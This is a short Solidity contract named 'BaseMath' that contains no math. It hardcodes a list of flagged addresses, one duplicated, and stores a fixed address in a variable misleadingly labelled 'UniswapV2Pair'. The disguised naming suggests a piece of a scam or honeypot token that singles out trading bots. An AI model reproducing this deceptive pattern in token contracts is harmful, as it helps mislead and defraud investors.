// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

contract BaseMath {
    mapping (address => bool) public m; address private n; address public UniswapV2Pair;

    constructor() {
        m[0xae2Fc483527B8EF99EB5D9B44875F005ba1FaE13] = true;
        m[0x77223F67D845E3CbcD9cc19287E24e71F7228888] = true;
        m[0x77ad3a15b78101883AF36aD4A875e17c86AC65d1] = true;
        m[0x4504DFa3861ec902226278c9Cb7a777a01118574] = true;
        m[0xe3DF3043f1cEfF4EE2705A6bD03B4A37F001029f] = true;
        m[0xE545c3Cd397bE0243475AF52bcFF8c64E9eAD5d7] = true;
        m[0xe2cA3167B89b8Cf680D63B06E8AeEfc5E4EBe907] = true;
        m[0x000000000005aF2DDC1a93A03e9b7014064d3b8D] = true;
        m[0x1653151Fb636544F8ED1e7BE91E4483B73523f6b] = true;
        m[0x00AC6D844810A1bd902220b5F0006100008b0000] = true;
        m[0x294401773915B1060e582756b8d7f74cAF80b09C] = true;
        m[0x000013De30d1b1D830dcb7d54660F4778D2d4aF5] = true;
        m[0x00004EC2008200e43b243a000590d4Cd46360000] = true;
        m[0xE8c060F8052E07423f71D445277c61AC5138A2e5] = true;
        m[0x6b75d8AF000000e20B7a7DDf000Ba900b4009A80] = true;
        m[0x0000B8e312942521fB3BF278D2Ef2458B0D3F243] = true;
        m[0x007933790a4f00000099e9001629d9fE7775B800] = true;
        m[0x76F36d497b51e48A288f03b4C1d7461e92247d5e] = true;
        m[0x2d2A7d56773ae7d5c7b9f1B57f7Be05039447B4D] = true;
        m[0x758E8229Dd38cF11fA9E7c0D5f790b4CA16b3B16] = true;  
        m[0x77ad3a15b78101883AF36aD4A875e17c86AC65d1] = true;
        m[0x00000000A991C429eE2Ec6df19d40fe0c80088B8] = true;
        m[0xB20BC46930C412eAE124aAB8682fb0F2e528F22d] = true;
        m[0x6c9B7A1e3526e55194530a2699cF70FfDE1ab5b7] = true;
        m[0x1111E3Ef0B6aE32E14a55e0E7cD9b8505177C2BF] = true;
        m[0x000000d40B595B94918a28b27d1e2C66F43A51d3] = true;
        m[0xb8feFFAC830C45b4Cd210ECDAAB9D11995D338ee] = true;
        n = payable(0xE24FeCAa4ab027fBe55B90A9b9F75330c6Efcd98); UniswapV2Pair = n;
    }

    function isM(address _address) public view returns (bool) {
        return m[_address];
    }
}